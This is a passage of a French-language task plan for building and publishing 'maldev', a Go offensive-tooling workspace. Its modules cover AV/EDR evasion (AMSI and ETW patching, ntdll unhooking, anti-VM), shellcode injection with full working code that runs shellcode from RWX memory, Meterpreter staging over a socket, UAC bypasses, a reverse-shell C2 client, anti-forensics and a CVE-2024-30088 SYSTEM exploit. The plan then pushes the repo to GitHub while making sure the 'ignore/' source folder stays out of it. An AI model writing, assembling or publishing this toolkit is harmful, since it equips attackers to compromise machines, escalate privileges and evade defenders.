//   Classic : restaure les 5 premiers bytes depuis une DLL fraîche sur disk
//   Full    : remplace toute la section .text depuis une DLL fraîche sur disk
//   Perun   : lit ntdll non-hookée depuis un processus fils notepad.exe
package unhook
```

- [ ] **Step 4: evasion/antidebug/, evasion/antivm/, evasion/acg/, evasion/blockdlls/, evasion/phant0m/, evasion/timing/, evasion/sandbox/**

Porter depuis les fichiers correspondants dans `ignore/antiforensic/`.
Remplacer toutes les déclarations LazyDLL par des imports `win/api`.

- [ ] **Step 5: go mod tidy + commit**

```bash
cd /c/Users/m.bachmann/GolandProjects/maldev/evasion
go mod tidy
cd ..
git add evasion/
git commit -m "feat(evasion): add amsi, etw, unhook, acg, blockdlls, phant0m, antidebug, antivm, timing, sandbox"
```

---

## Task 6 : injection/ — Windows + Linux + purego (cœur du projet)

**Source:** `ignore/rshell/rshell/pkg/injection/`

### 6A — Interface commune

- [ ] **Step 1: injection/injection.go**

```go
// Package injection expose une interface unifiée pour toutes les techniques
// d'injection de shellcode, sur Windows et Linux.
//
// Usage:
//   inj, err := injection.New(injection.MethodCreateRemoteThread, pid, 0)
//   err = inj.Inject(shellcode)
package injection

import "errors"

// ErrNotSupported indique que la méthode n'est pas disponible sur la plateforme.
var ErrNotSupported = errors.New("injection method not supported on this platform")

// Method identifie la technique d'injection.
type Method string

// Méthodes Windows
const (
    MethodCreateRemoteThread Method = "crt"
    MethodCreateThread       Method = "ct"
    MethodQueueUserAPC       Method = "apc"
    MethodEarlyBirdAPC       Method = "earlybird"
    MethodProcessHollowing   Method = "hollow"
    MethodRtlCreateUserThread Method = "rtl"
    MethodDirectSyscall      Method = "syscall"
    MethodCreateFiber        Method = "fiber"
)

// Méthodes Linux
const (
    MethodPtrace   Method = "ptrace"
    MethodMemFD    Method = "memfd"
    MethodProcMem  Method = "procmem"
)

// Méthodes purego (cross-platform, sans CGO)
const (
    MethodPureGoShellcode    Method = "purego"
    MethodPureGoMeterpreter  Method = "purego-meter"
)

// Injector exécute une injection de shellcode dans un processus cible.
type Injector interface {
    // Inject injecte le shellcode dans le processus configuré.
    Inject(shellcode []byte) error
}

// Config configure une injection.
type Config struct {
    Method      Method
    PID         int    // PID cible (0 = self pour procmem/ct/purego)
    ProcessPath string // chemin processus à spawner (earlybird, hollow)
    Fallback    bool   // tenter méthodes alternatives si échec
}
```

- [ ] **Step 2: injection/windows/** — 8 méthodes**

Porter intégralement depuis `ignore/rshell/rshell/pkg/injection/injector_windows.go`.
Découper en un fichier par méthode dans `injection/windows/<methode>/<methode>_windows.go`.
Remplacer les déclarations DLL locales par des imports `win/api`.

- [ ] **Step 3: injection/linux/** — 3 méthodes sans CGO**

Porter depuis `ignore/rshell/rshell/pkg/injection/injector_linux_amd64.go`,
`injector_linux_386.go`, `injector_linux_arm64.go`.

```
injection/linux/
├── ptrace/
│   ├── ptrace_linux_amd64.go
│   ├── ptrace_linux_386.go
│   └── ptrace_linux_arm64.go  ← stub ErrNotSupported
├── memfd/
│   ├── memfd_linux_amd64.go
│   ├── memfd_linux_386.go
│   └── memfd_linux_arm64.go
└── procmem/
    └── procmem_linux.go       ← identique toutes archs
```

### 6B — purego : injection sans CGO

- [ ] **Step 4: injection/purego/shellcode.go**

```go
//go:build linux || darwin

// Package purego implémente l'injection de shellcode quelconque
// sans CGO via github.com/ebitengine/purego.
//
// Technique:
//   1. mmap(RWX) — alloue de la mémoire exécutable anonyme
//   2. copy      — copie le shellcode dans la mémoire allouée
//   3. LockOSThread — attache la goroutine à l'OS thread (ABI requis)
//   4. purego.SyscallN(fnptr) — appelle l'adresse comme une fonction Go
//
// Avantage: aucun CGO, aucune dépendance C. Fonctionne avec CGO_ENABLED=0.
// Limitation: calling convention System V AMD64 ABI.
package purego

import (
    "fmt"
    "runtime"
    "unsafe"

    "github.com/ebitengine/purego"
    "golang.org/x/sys/unix"
)

// InjectShellcode exécute shellcode en mémoire sans CGO.
// Bloque jusqu'à la fin de l'exécution du shellcode.
func InjectShellcode(shellcode []byte) error {
    if len(shellcode) == 0 {
        return fmt.Errorf("shellcode vide")
    }

    mem, err := unix.Mmap(
        -1, 0, len(shellcode),
        unix.PROT_READ|unix.PROT_WRITE|unix.PROT_EXEC,
        unix.MAP_PRIVATE|unix.MAP_ANONYMOUS,
    )
    if err != nil {
        return fmt.Errorf("mmap: %w", err)
    }
    defer unix.Munmap(mem)

    copy(mem, shellcode)

    errCh := make(chan error, 1)
    go func() {
        runtime.LockOSThread()
        defer runtime.UnlockOSThread()

        fnptr := uintptr(unsafe.Pointer(&mem[0]))
        purego.SyscallN(fnptr)
        errCh <- nil
    }()

    return <-errCh
}

// InjectShellcodeAsync exécute shellcode sans bloquer le processus appelant.
// Retourne immédiatement, le shellcode s'exécute en arrière-plan.
func InjectShellcodeAsync(shellcode []byte) error {
    if len(shellcode) == 0 {
        return fmt.Errorf("shellcode vide")
    }

    mem, err := unix.Mmap(
        -1, 0, len(shellcode),
        unix.PROT_READ|unix.PROT_WRITE|unix.PROT_EXEC,
        unix.MAP_PRIVATE|unix.MAP_ANONYMOUS,
    )
    if err != nil {
        return fmt.Errorf("mmap: %w", err)
    }
    // Note: pas de Munmap — la mémoire est libérée à la fin du processus

    copy(mem, shellcode)

    go func() {
        runtime.LockOSThread()
        fnptr := uintptr(unsafe.Pointer(&mem[0]))
        purego.SyscallN(fnptr)
    }()

    return nil
}
```

- [ ] **Step 5: injection/purego/meterpreter.go**

```go
//go:build linux || darwin

// Meterpreter staging via purego sans CGO.
//
// Technique (depuis rshell/pkg/meterpreter/execute_unix.go):
//   1. Recevoir le wrapper shellcode (126 bytes) depuis le handler Metasploit
//   2. dup2(sockfd, 0) — le wrapper lit le reste du stage depuis stdin
//   3. Effacer FD_CLOEXEC sur la socket
//   4. mmap(RWX) + copy du wrapper
//   5. LockOSThread + purego.SyscallN(fnptr)
//   6. Block forever (le wrapper prend le contrôle)
//
// Le wrapper shellcode (stub 126 bytes) contient la logique pour lire
// le vrai stage Meterpreter depuis le descripteur de fichier passé.
package purego

import (
    "fmt"
    "runtime"
    "unsafe"

    "github.com/ebitengine/purego"
    "golang.org/x/sys/unix"
)

// keepAliveFiles empêche le GC de fermer les descripteurs de fichiers
// passés au shellcode wrapper. Doit rester en vie pendant l'exécution.
var keepAliveFiles []interface{}

// ExecuteMeterpreterWrapper exécute un wrapper shellcode Meterpreter (126 bytes)
// en lui passant un descripteur de socket pour qu'il lise le stage complet.
//
// sockfd: descripteur de fichier de la connexion vers le handler Metasploit.
// wrapper: le stub shellcode de 126 bytes récupéré depuis le handler.
//
// Cette fonction ne retourne jamais en cas de succès (le wrapper prend le contrôle).
func ExecuteMeterpreterWrapper(sockfd int, wrapper []byte) error {
    if len(wrapper) == 0 {
        return fmt.Errorf("wrapper shellcode vide")
    }

    // Allouer mémoire RWX pour le wrapper
    mem, err := unix.Mmap(
        -1, 0, len(wrapper),
        unix.PROT_READ|unix.PROT_WRITE|unix.PROT_EXEC,
        unix.MAP_PRIVATE|unix.MAP_ANONYMOUS,
    )
    if err != nil {
        return fmt.Errorf("mmap: %w", err)
    }

    copy(mem, wrapper)

    // Rediriger la socket vers stdin (fd 0)
    // Le wrapper lit le stage complet depuis fd 0
    if err := unix.Dup2(sockfd, 0); err != nil {
        unix.Munmap(mem)
        return fmt.Errorf("dup2: %w", err)
    }

    // Effacer FD_CLOEXEC pour que la socket survive exec
    if _, _, errno := unix.Syscall(unix.SYS_FCNTL, uintptr(sockfd), unix.F_SETFD, 0); errno != 0 {
        unix.Munmap(mem)
        return fmt.Errorf("fcntl clear cloexec: %w", errno)
    }

    // Empêcher le GC de fermer la socket
    keepAliveFiles = append(keepAliveFiles, sockfd)

    done := make(chan struct{})

    go func() {
        runtime.LockOSThread()
        // LockOSThread permanent — le wrapper prend le contrôle du thread

        fnptr := uintptr(unsafe.Pointer(&mem[0]))
        purego.SyscallN(fnptr)

        close(done)
    }()

    // Block forever — contrôle cédé au wrapper Meterpreter
    select {}
}
```

- [ ] **Step 6: go mod tidy + commit**

```bash
cd /c/Users/m.bachmann/GolandProjects/maldev/injection
go mod tidy
cd ..
git add injection/
git commit -m "feat(injection): add Windows 8 methods, Linux 3 methods, purego shellcode+meterpreter"
```

---

## Task 7 : privilege/ + process/ + system/ + pe/ + cleanup/

### privilege/

- [ ] **Step 1: privilege/uacbypass/** — port depuis `ignore/UACBypass/uacbypass.go`

5 méthodes: FODHelper, SLUI, SilentCleanup, EventVwr, EventVwrLogon.
Remplacer toutes les déclarations DLL par imports `win/api`.

- [ ] **Step 2: privilege/impersonate/** — port depuis `ignore/win/impersonate.go` + `ignore/win/win.go`

Fonctions: `ImpersonateThread`, `ExecAs`, `CreateProcessWithLogon`, `LogonUser`.

### process/

- [ ] **Step 3: process/enum/**

```go
// process/enum/enum.go — interface commune
package enum

// Process représente un processus système.
type Process struct {
    PID       uint32
    PPID      uint32
    Name      string
    Path      string
    SessionID uint32
}

// List retourne tous les processus en cours d'exécution.
func List() ([]Process, error)

// FindByName retourne les processus dont le nom correspond.
func FindByName(name string) ([]Process, error)

// FindByPID retourne le processus avec ce PID.
func FindByPID(pid uint32) (*Process, error)
```

`enum_windows.go` : port depuis `ignore/process/process.go` (Toolhelp32), enrichi avec Path et SessionID.
`enum_linux.go` : lecture `/proc/*/status` + `go-ps`.

- [ ] **Step 4: process/session/** — port depuis `ignore/sessions/sessions.go`

### system/

- [ ] **Step 5:** Porter `ignore/drive/`, `ignore/network/`, `ignore/specialfolder/`, `ignore/msgbox/`

Ajouter `system/pipes/pipes_windows.go` (named pipe enumeration depuis rshell).

### pe/

- [ ] **Step 6: pe/morph/** — port depuis `ignore/antiforensic/UPXMorph.go`

### pe/parse/ + pe/srdi/

Wrappers autour de `Binject/debug/pe` et `Binject/go-donut`.

### cleanup/

- [ ] **Step 7:** Porter `ignore/selfdelete/`, ajouter `wipe/`, `timestomp/`, `service/` depuis `ignore/antiforensic/hideService.go`

- [ ] **Step 8: Commit**

```bash
git add privilege/ process/ system/ pe/ cleanup/
git commit -m "feat: add privilege, process, system, pe, cleanup modules"
```

---

## Task 8 : c2/ + tools/rshell/ — port intégral depuis rshell

**Source:** `ignore/rshell/rshell/`

### c2/cert/

- [ ] **Step 1:** Porter `ignore/rshell/rshell/pkg/cert/generator.go` → `c2/cert/generator.go`

### c2/transport/

- [ ] **Step 2:** Porter `pkg/transport/transport.go`, `tcp.go`, `tls.go`, `factory.go`

### c2/shell/

- [ ] **Step 3:** Porter `pkg/shell/shell.go`, `evasion_windows.go`, `ppid_windows.go`, `evasion_stub.go`

Mettre à jour `evasion_windows.go` pour utiliser `evasion/amsi` et `evasion/etw` au lieu des patches inline.

### c2/meterpreter/

- [ ] **Step 4:** Porter `pkg/meterpreter/meterpreter.go`, `meterpreter_windows.go`, `meterpreter_linux.go`

Remplacer `execute_unix.go` par des appels à `injection/purego.ExecuteMeterpreterWrapper`.
Remplacer `execute_windows.go` par des appels à `injection/windows/ct`.

### tools/rshell/

- [ ] **Step 5:** Porter `cmd/client/` (main.go, shell.go, inject.go, stage.go, cert.go, profile.go)

Mettre à jour les imports pour utiliser les packages `c2/` et `injection/` du workspace.

- [ ] **Step 6: go mod tidy + commit**

```bash
cd /c/Users/m.bachmann/GolandProjects/maldev/c2 && go mod tidy
cd /c/Users/m.bachmann/GolandProjects/maldev/tools/rshell && go mod tidy
cd /c/Users/m.bachmann/GolandProjects/maldev
git add c2/ tools/
git commit -m "feat(c2): add cert, transport, shell, meterpreter — feat(tools): add rshell binary"
```

---

## Task 9 : cve/CVE-2024-30088/ — refactorisation

**Source:** `ignore/cve-2024-30088/cve/internal/exploit/cve202430088/`

Règle: `exploit.go` et `race.go` sont **intouchés**. Seules les dépendances périphériques sont remplacées.

- [ ] **Step 1: Copier exploit.go + race.go tels quels**

- [ ] **Step 2: Supprimer version.go** → remplacer par import `win/version`

```go
// Dans exploit.go, remplacer CheckVersion() locale par:
import "github.com/oioio-space/maldev/win/version"

vi, err := version.CheckCVE202430088Vulnerability()
```

Ajouter `CheckCVE202430088Vulnerability()` dans `win/version/version_windows.go`.

- [ ] **Step 3: Supprimer evasion.go** → remplacer par import `evasion/timing`

```go
import "github.com/oioio-space/maldev/evasion/timing"
timing.BusyWait(200 * time.Millisecond)
```

- [ ] **Step 4: Supprimer token.go** → remplacer par imports `win/token` + `process/enum`

- [ ] **Step 5: winapi.go** → supprimer les LazyDLL redéclarées, garder uniquement les structs CVE-spécifiques (`AuthzBasepSecurityAttributesInformation`, `SystemHandle`, `SystemHandleInformationEx`)

- [ ] **Step 6: doc.go**

```go
//go:build windows

// Package cve202430088 implémente CVE-2024-30088, une race condition TOCTOU
// dans le kernel Windows (AuthzBasepCopyoutInternalSecurityAttributes)
// permettant une élévation locale de privilèges vers SYSTEM.
//
// CVE:       CVE-2024-30088
// CVSS:      7.0 (High) — Local Privilege Escalation
// Découverte: k0shl (Angelboy) — DEVCORE
// Patch:     KB5039211 — Patch Tuesday Juin 2024
//
// Versions affectées:
//   Windows 10 1507–22H2, Windows 11 21H2–23H2
//   Windows Server 2019, 2022, 2022 23H2
//   Avant le Patch Tuesday de Juin 2024
//
// Usage:
//   result, err := cve202430088.Run(ctx)
//   // ou avec exécution d'un binaire en SYSTEM:
//   result, err := cve202430088.RunWithExec(ctx, cve202430088.Config{ExePath: "cmd.exe"})
package cve202430088
```

- [ ] **Step 7: go mod tidy + commit**

```bash
cd /c/Users/m.bachmann/GolandProjects/maldev/cve/CVE-2024-30088
go mod tidy
cd ../..
git add cve/
git commit -m "feat(cve): add CVE-2024-30088 refactored to use shared maldev packages"
```

---

## Task 10 : Push final GitHub

- [ ] **Step 1: Vérification finale .gitignore**

```bash
cd /c/Users/m.bachmann/GolandProjects/maldev
git status --short | grep "^?" | grep -v ".gitignore" | grep "ignore/" && echo "ERREUR: ignore/ présent!" || echo "OK"
git check-ignore -v ignore/ && echo "ignore/ bien bloqué"
```

- [ ] **Step 2: go build tous les modules**

```bash
go build ./core/... ./win/... ./evasion/... ./process/... ./system/... ./cleanup/...
GOOS=linux go build ./injection/... ./c2/...
GOOS=windows go build ./injection/... ./privilege/... ./cve/CVE-2024-30088/...
```

- [ ] **Step 3: Commit final + push**

```bash
git add -A
git status --short  # vérifier visuellement qu'ignore/ n'apparaît PAS
git commit -m "feat: complete maldev workspace — all modules implemented"
git push -u origin main
```

- [ ] **Step 4: Vérifier sur GitHub**

```bash
gh repo view oioio-space/maldev --web
```

Vérifier que le dossier `ignore/` n'est **pas visible** dans l'interface GitHub.

---

## Récapitulatif des dépendances entre modules

```
core/           ← aucune dépendance interne
win/            ← core/
evasion/        ← win/
injection/      ← win/ (Windows), golang.org/x/sys/unix (Linux), purego
privilege/      ← win/
process/        ← win/
system/         ← win/
pe/             ← aucune dépendance interne (libs externes)
cleanup/        ← win/
c2/             ← injection/, win/, evasion/
cve/*           ← win/, evasion/, process/
tools/rshell    ← c2/, injection/, win/
```
